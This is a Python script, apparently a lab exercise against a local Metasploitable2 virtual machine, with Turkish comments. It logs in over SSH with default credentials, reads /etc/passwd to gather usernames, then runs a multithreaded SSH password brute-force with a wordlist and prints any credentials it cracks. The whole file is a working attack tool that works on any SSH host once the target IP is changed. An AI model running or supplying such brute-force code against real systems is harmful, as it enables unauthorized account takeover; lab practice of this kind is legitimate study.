import time
import paramiko
from concurrent.futures import ThreadPoolExecutor
#denemede kullanılan veriler bilgisayara yerel olarak kurulan metasploitable2 makinesi üzerinde denenmiştir.
#https://sourceforge.net/projects/metasploitable/ -> makine linki

ip = "192.168.133.128"
port = 22
username = "msfadmin"
password = "msfadmin"

command = 'cat /etc/passwd'
max_threads = 8
# İlk SSH bağlantısı: /etc/passwd dosyasını almak için
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(ip, port=port, username=username, password=password)

stdin, stdout, stderr = ssh.exec_command(command)
cmd_out = stdout.read()

etcpasswd = cmd_out.decode().split('\n')

# Kullanıcı listesi oluşturma
user_list = []
for e in etcpasswd:
    username = e.split(':')[0]
    if username:  # Boş satırları atlamak için
        user_list.append(username)

# Şifre listesi okuma ve temizleme
with open('passlist.txt', 'r') as passfile:
    passs = passfile.readlines()

temizlenmis_pass = [satir.strip() for satir in passs]

threads = []
user_pass = {}
# Şifre deneme fonksiyonu (kullanıcı adı ve şifreyi parametre olarak alır)
def try_pass(user, pasw):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(f"Denemeye çalışılıyor... username: {user}, password: {pasw}")
        ssh.connect(ip, port=port, username=user, password=pasw,timeout=0.1)
        user_pass[user]=pasw
        print(f"Bağlantı kuruldu! username: {user}, password: {pasw}")
    except Exception:
        pass
    finally:
        ssh.close()
start_time = time.time()
# Kullanıcı adı ve şifreleri deneme
with ThreadPoolExecutor(max_threads) as executor:
    for user in user_list:
        for pasw in temizlenmis_pass:
            executor.submit(try_pass, user, pasw)

end_time = time.time()
print("Geçen süre:",end_time-start_time)

for user, pasw in user_pass.items():
    print(f"username: {user} password: {pasw}")
